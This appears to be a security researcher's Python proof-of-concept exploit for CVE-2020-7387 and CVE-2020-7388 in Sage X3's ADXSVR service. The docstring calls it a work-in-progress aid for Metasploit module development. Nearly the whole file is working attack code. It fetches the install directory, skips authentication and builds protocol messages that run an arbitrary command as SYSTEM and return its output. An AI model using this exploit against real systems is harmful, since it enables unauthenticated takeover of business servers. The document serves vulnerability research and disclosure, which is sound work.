#!/usr/bin/python3
from socket import *
from random import randint
import argparse
import time
import sys
"""
Sage X3 Unauthenticated Remote Code Execution as SYSTEM.
Exploits Sage's custom ADXSVR service and protocol.
CVE-2020-7388 and CVE-2020-7387

Work-in-progress, to be used as an oracle for developing metaspoit modules
Currently this successfully implements the ADXDIR command to obtain from the X3
server, the install path to be used in future commands
run_cmd leverages the ADXDIR command to generate the messages to send to the X3
according to the protocol

exploit_authors = "@deadjakk, @ac3lives (Aaron Herndon)"
Discovered and disclosed in December of 2020
"""

def encrypt(inp):
    K_CHARSET = 'cromanwqxfzpgedkvstjhyilu'
    ret = ""
    num2 = len(inp) # num2
    num = 17 # the 'key'

    for i in range(0,num2):
        num5  = ord(inp[i]) 
        num7 = num5/num
        num10 = (num5 % num)
        num11 = ord("zxWyZxzvwYzxZXxxZWWyWxYXz"[i])
        num12 = num11 - num7
        if not num12.is_integer():
            num12+=1
        ret+=   chr(int(num12)) # something wrong here
        ret+=chr(ord("cromanwqxfzpgedkvstjhyilu"[num10])) # charset
        k_off = K_CHARSET.find(ret[-1]) 
        if k_off& 1 ==0:
            ret += chr(ord("cf2tln3yuVkDr7oPaQ8bsSd4x"[k_off]))
    return ret

def recv_timeout(the_socket,timeout=2):
    #make socket non blocking
    the_socket.setblocking(0)
    #total data partwise in an array
    total_data=[];
    data='';
    #beginning time
    begin=time.time()
    while 1:
        #if you got some data, then break after timeout
        if total_data and time.time()-begin > timeout:
            break
        #if you have no data at all, wait a little longer, twice the timeout
        elif time.time()-begin > timeout*2:
            break
        #recv something
        try:
            data = the_socket.recv(8192)
            if data:
                total_data.append(data)
                #change the beginning time for measurement
                begin=time.time()
            else:
                #sleep for sometime to indicate a gap
                time.sleep(0.1)
        except:
            pass
    #join all parts to make final string
    return b''.join(total_data)

def adxdir(cmd,ip,port):
    s=socket(AF_INET,SOCK_STREAM)
    s.connect((ip,port))
    print("connected")
    buf = b'\x09\x00\x00\x00'
    s.sendall(buf)
    res = recv_timeout(s,2)
    print ("sending directory retrieval message:",buf)
    print ("received directory from server:",res)
    return res[8:-1]

def runcmd(cmd,ip,port):
    filename = str(randint(10000000,99999999))
    sagedir = adxdir(cmd,ip,port)
    if not sagedir:
        print("ADXDIR command failed")
        sys.exit(1)

    dec_sagedir = sagedir.decode() 

    # 'delimeters'
    bufm=b'\x02\x00\x01\x01'
    bufn=b'\x02\x00\x05\x05\x00\x00\x10\x00'

    # Buffer 2 
    # b'\x00\x006\x02\x00.\x00,@D:/Sage/SafeX3/AdxAdmin/tmp/cmd22698965$cmd\x00\x03\x00\x01w'
    refmt_sagedir = "@{}/tmp/cmd{}$cmd".format(
            dec_sagedir.replace("\\","/"),
            filename
        )
    buf2=b'\x00\x00\x36\x02\x00\x2e\x00' # head
    buf2+= bytes([ len(refmt_sagedir) ])
    buf2+=refmt_sagedir.encode()
    buf2+=b'\x00\x03\x00\x01\x77' # tail
    #print("buf2------>",buf2)

    # buffer 3 , command message
    # b'\x02\x00\x05\x08\x00\x00\x00\x08ipconfig'
    
    command = b'\x02\x00\x05\x08\x00\x00\x00' # head
    command += bytes([ len(cmd) ]) 
    command += cmd.encode()

    # @D:/Sage/SafeX3/AdxAdmin/tmp/sess98153631\$cmd
    #  \x00\x007\x02\x00/\x00-@D:/Sage/SafeX3/AdxAdmin/tmp/sess49830584$cmd\x00\x03\x00\x01w
    refmt_sagedir = "@{}/tmp/sess{}$cmd".format(
             dec_sagedir.replace("\\","/"),
             filename
         )

    buf4=b'\x00\x00\x37\x02\x00\x2f\x00' # header
    buf4+= bytes([ len(refmt_sagedir) ]) # length of the sess file name
    buf4+= refmt_sagedir.encode() # actual sess<eigth num>$cmd filename
    buf4+=b'\x00\x03\x00\x01\x77' # 'tail' of packet

    # Buffer 5 you can apparently send this one multple times
    # b'\x02\x00\x05\x08\x00\x00\x00\x96@echo off\r\nD:\\Sage\\SafeX3\\AdxAdmin\\tmp\\cmd36886416.cmd 1>D:\\Sage\\SafeX3\\adxAdmin\\tmp\\36886416.out 2>D:\\Sage\\SafeX3\\AdxAdmin\\tmp\\36886416.err\r\n@echo on'
    refmt_sagedir = "@echo off\r\n{}\\tmp\\cmd{}.cmd 1>{}\\tmp\\{}.out 2>{}\\tmp\\{}.err\r\n@echo on".format(
            dec_sagedir,filename,dec_sagedir,filename,dec_sagedir,filename
        )

    buf5=b'\x02\x00\x05\x08\x00\x00\x00'
    buf5+=bytes([ len(refmt_sagedir) ])
    buf5+= refmt_sagedir.encode()

    # Buffer 6, staging
    # \x00\x006\x04\x00.\x00(D:\\Sage\\SafeX3\\AdxAdmin\\tmp\\sess32976937.cmd\x00\x03\x00\x01r
    refmt_sagedir = "{}\\tmp\\sess{}.cmd".format(
            dec_sagedir,filename
        )
    buf6=b'\x00\x00\x36\x04\x00\x2e\x00'
    buf6+=bytes([ len(refmt_sagedir)  ])
    buf6+= refmt_sagedir.encode()
    buf6+=b'\x00\x03\x00\x01\x72' # Tail


    # Buffer 7 apparently unnecessary 
    # \x00\x00/\x07\x08\x00+\x00)@D:/Sage/SafeX3/AdxAdmin/tmp/62145446$out
    refmt_sagedir = "@{}/tmp/{}$out".format(
            dec_sagedir.replace("\\","/"),
            filename
        )
    buf7=b'\x00\x00\x2f\x07\x08\x00\x2b\x00'
    buf7+= bytes([ len(refmt_sagedir) ])
    buf7+=refmt_sagedir.encode()

    # Buffer 8, very similar to previous but this has a different 'head' and a 'tail'
    # b'\x00\x003\x02\x00+\x00)@D:/Sage/SafeX3/AdxAdmin/tmp/92218945$out\x00\x03\x00\x01r'
    refmt_sagedir = "@{}/tmp/{}$out".format(
            dec_sagedir.replace("\\","/"),
            filename
        )
    buf8=b'\x00\x00\x33\x02\x00\x2b\x00'
    buf8+= bytes([ len(refmt_sagedir) ])
    buf8+=refmt_sagedir.encode()
    buf8+=b'\x00\x03\x00\x01\x72' # tail of message

    ######## command auth
    s=socket(AF_INET,SOCK_STREAM)
    s.connect((ip,port))
    print("connected")

    # building the buffer
    #fbuf = b'\x06.\x08xxxxxxxa\x08xxxxxxxa\x1bCRYPT:txurfQdoszkwhatajokej'
    fbuf = b'\x06\x00'
    print('sending command authentication message --->',fbuf)
    s.send(fbuf)

    res = s.recv(1024)
    print('command auth response ---->',res)
    if len(res) != 4:
        print ("password incorrect!")
        sys.exit(1)
    else:
        print ("command auth successful")
    s.send(buf2)
    res = s.recv(1024)



    print('sending command --->',command)
    s.send(command)
    # recv thing
    res = s.recv(1024)

    s.send(bufm)
    # recv thing
    res = s.recv(1024)

    s.send(buf4)
    # recv thing
    #print('----> buf4',buf4)
    res = s.recv(1024)

    s.send(buf5)
    # recv thing
    #print('----> buf5',buf5)
    res = s.recv(1024)

    s.send(bufm)
    # recv thing
    res = s.recv(1024)

    s.send(buf6)
    #print('----> buf6',buf6)
    res = s.recv(1024)

    s.send(bufn)
    res = s.recv(1024)

    s.send(bufm)
    res = s.recv(1024)

    s.send(buf7)
    #print('----> buf7',buf7)
    res = s.recv(1024)

    s.send(buf8)
    #print('----> buf8',buf8)
    res = s.recv(1024)

    s.send(bufn)
    res = s.recv(4096)
    s.close()
    # print('raw-',res)
    print ("command output:",end="")
    if res != b'\x00\x00\x00\x01\xae' and res != b'\x00':
        answer=(res.decode('utf-8',errors='ignore'))
        return answer
    return 2 # buffer might be doing weird things, try again


if '__main__' == __name__: 
    parser=argparse.ArgumentParser()
    parser.add_argument('--cmd',help='command to run',required=True)
    parser.add_argument('--ip',help='remote host ip',required=False,default='10.1.1.2')
    parser.add_argument('--port',help='remote host ip',required=False,default=50000)
    args=parser.parse_args()
    errors =0 

    result = runcmd(args.cmd,args.ip,int(args.port))
    while result == 2 :
        result = runcmd(args.cmd,args.ip,int(args.port))
        if errors > 10:
            print("too many errors, should have died or worked, sorry")
            sys.exit(1)
    print(result)
